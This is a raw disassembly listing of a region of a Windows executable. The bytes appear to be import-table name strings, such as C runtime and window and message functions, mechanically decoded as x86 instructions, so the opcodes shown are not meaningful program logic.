  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
